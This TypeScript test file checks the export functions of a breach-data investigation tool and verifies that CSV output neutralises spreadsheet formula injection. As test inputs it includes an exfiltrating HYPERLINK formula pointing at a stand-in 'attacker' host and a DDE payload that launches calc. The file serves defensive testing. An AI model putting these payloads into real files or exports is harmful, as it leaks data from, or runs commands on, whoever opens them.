import { test } from "node:test";
import assert from "node:assert/strict";
import { csvField, toCSV, toJSON, exportName } from "../lib/export.ts";
import { buildReport } from "../lib/report.ts";
import { buildSubject } from "../lib/subject.ts";
import type { LeakDatabase } from "../lib/leakosint.ts";

const db = (name: string, info: string, ...rows: Record<string, string>[]): LeakDatabase => ({ name, info, rows });
const JANE = buildSubject("jane.doe@example.com");

// ---- the security control, not the formatting ------------------------------------
// Every value here was written by whoever assembled the dump. A spreadsheet runs a cell
// beginning = + - @ as a FORMULA, and formulas can call out to a URL. An export that
// passes one through fires it when the analyst opens the file, delivered by the tool
// they were using to investigate it.

test("a value that would run as a formula is neutralised, not altered", () => {
  const payload = '=HYPERLINK("http://attacker/"&A1,"open")';
  const out = csvField(payload);
  assert.ok(out.startsWith(`"'=`), "forced to text with a leading apostrophe");
  assert.ok(out.includes("attacker"), "and the value itself is preserved, this is evidence");
});

test("every character a spreadsheet treats as a formula start is caught", () => {
  for (const c of ["=", "+", "-", "@", "\t", "\r"]) {
    assert.ok(csvField(c + "cmd").startsWith(`"'`), `${JSON.stringify(c)} must be neutralised`);
  }
});

test("ordinary values are not touched", () => {
  assert.equal(csvField("jane.doe@example.com"), '"jane.doe@example.com"');
  assert.equal(csvField("Paris"), '"Paris"');
  assert.equal(csvField(""), '""');
  assert.equal(csvField(null), '""');
});

test("quotes, commas and newlines survive a round trip", () => {
  assert.equal(csvField('a "quoted" value'), '"a ""quoted"" value"');
  assert.equal(csvField("one,two"), '"one,two"');
  assert.equal(csvField("line\nbreak"), '"line\nbreak"');
});

// ---- the table ---------------------------------------------------------------------

test("one line per fact, with the breach and the date it came from", () => {
  const r = buildReport(JANE, [
    db("Dump A", "In 2019 something leaked.", { Email: "jane.doe@example.com", Password: "hunter2" }),
  ]);
  const lines = toCSV(r).split("\r\n");
  assert.match(lines[0], /^"subject","subject_kind","section"/);
  assert.ok(lines.some((l) => l.includes('"hunter2"') && l.includes('"Dump A"') && l.includes('"2019"')));
});

test("a formula hidden in a breach value is still neutralised through the whole report", () => {
  const r = buildReport(JANE, [
    db("Dump A", "", { Email: "jane.doe@example.com", Note: "=cmd|'/c calc'!A1" }),
  ]);
  const csv = toCSV(r);
  assert.ok(csv.includes(`"'=cmd`), "the payload is text");
  assert.ok(!/(^|,)"=cmd/.test(csv), "and never begins a cell as a formula");
});

test("the raw records can be appended, keeping the dump's own column names", () => {
  const r = buildReport(JANE, [db("Dump A", "", { Email: "jane.doe@example.com", LastLogin: "2021-09-30" })]);
  const plain = toCSV(r);
  const withRows = toCSV(r, { records: true });
  assert.ok(!plain.includes("LastLogin"), "the classifier drops it as metadata");
  assert.ok(withRows.includes('"LastLogin"'), "and the raw export keeps it");
});

test("JSON carries the question as well as the answer", () => {
  const r = buildReport(JANE, []);
  const out = JSON.parse(toJSON(r, { limit: 300 }));
  assert.equal(out.report.subject.raw, "jane.doe@example.com");
  assert.deepEqual(out.query, { limit: 300 });
});

test("the filename sorts by date and says what it is", () => {
  const r = buildReport(JANE, []);
  const n = exportName(r, "csv", new Date("2026-11-05T19:30:00Z"));
  assert.match(n, /^octopus-jane\.doe@example\.com-2026-11-05-19-30-00\.csv$/);
});

test("a subject that would be a bad filename is made into a safe one", () => {
  const n = exportName(buildReport(buildSubject("Jean Pierre Dupont"), []), "json");
  assert.ok(!/[/\\:*?"<>|]/.test(n), "nothing a filesystem would refuse");
});

// ---- a case, out of the tool ---------------------------------------------------------

import { caseToCSV, caseToJSON, caseExportName } from "../lib/export.ts";
import { buildBoard } from "../lib/casework.ts";

const FILE = { id: "c1", ref: "INC-2026-114", title: "Stealer log", status: "open" as const, openedBy: "a@corp", openedAt: 1700000000000 };
const ENTS = [{ id: "e1", kind: "email" as const, value: "l.m@example.com", label: "stealer log 14", addedAt: 1700000000000 }];
const FACTS = [{
  id: "f1", entityId: "e1", category: "password", severity: "critical" as const,
  label: "Password", value: "Sablon2019!", source: "Vectra Fitness 2019", addedBy: "a@corp", addedAt: 1700000000000,
}];

test("a case export carries who pinned what, out of which database", () => {
  const csv = caseToCSV(FILE, ENTS, FACTS);
  assert.match(csv, /INC-2026-114/);
  assert.match(csv, /stealer log 14/);
  assert.match(csv, /Vectra Fitness 2019/);
  assert.match(csv, /a@corp/);
});

// The export is opened in a spreadsheet by a responder under time pressure, which is
// the best possible moment to land a payload on somebody.
test("a pinned value that is a formula is neutralised on the way out", () => {
  const evil = [{ ...FACTS[0], value: '=HYPERLINK("http://attacker/"&A1,"open")' }];
  const csv = caseToCSV(FILE, ENTS, evil);
  assert.ok(csv.includes(`"'=HYPERLINK`), "the leading = must be defused");
  assert.ok(!/\n"=/.test(csv) && !csv.includes(',"=HYPERLINK'), "and never left bare");
});

test("the JSON marks the board as derived rather than as evidence", () => {
  const board = buildBoard(ENTS, FACTS);
  const d = JSON.parse(caseToJSON(FILE, ENTS, FACTS, board, "a@corp"));
  assert.equal(d.case.ref, "INC-2026-114");
  assert.equal(d.facts.length, 1);
  assert.match(d.derived.note, /conclusion, not evidence/);
  assert.equal(d.exportedBy, "a@corp");
});

test("the filename says what it is and sorts by date", () => {
  assert.equal(caseExportName(FILE, "csv", new Date("2026-03-11T09:00:00Z")), "case-INC-2026-114-2026-03-11.csv");
  // a reference with a slash in it must not become a path
  assert.equal(caseExportName({ ...FILE, ref: "a/b c" }, "json", new Date("2026-03-11T09:00:00Z")), "case-a_b_c-2026-03-11.json");
});
